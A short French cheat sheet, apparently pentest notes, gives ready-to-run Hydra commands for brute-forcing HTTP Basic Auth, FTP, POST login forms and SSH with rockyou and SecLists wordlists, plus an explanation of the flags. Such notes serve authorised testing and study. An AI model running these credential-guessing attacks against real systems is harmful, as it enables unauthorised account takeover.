# Basic Auth
```bash
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -vV x.x.x.x http-get
```

# FTP
```bash
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -vV –f ftp://x.x.x.x
hydra -l username -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/10k-most-common.txt -vV –f ftp://x.x.x.x
```
# POST
```bash
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -vV x.x.x.x -s 80 http-post-form "/login:user=^USER^&password=^PASS^:F=Invalid" -I
```

# SSH
```bash
hydra -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -vV x.x.x.x ssh 
```

Explication des arguments
  - -f => Arrêter si une connexion est réussie
  - -I => Ignorer un fichier de restauration (d'une précédente tentative)
  - -l => Nom d'utilisateur à utiliser pour tenter une connexion en FTP
  - -L => Liste de nom d'utilisateur à utiliser pour tenter une connexion en FTP
  - -P => Liste de mot de passe à utiliser pour tenter une connexion en FTP
  - -s => Port à utiliser
  - -v => Mode verbose
  - -V => Montrer les tentatives
  - http-post-form => Body du form à utiliser sur le formulaire du site
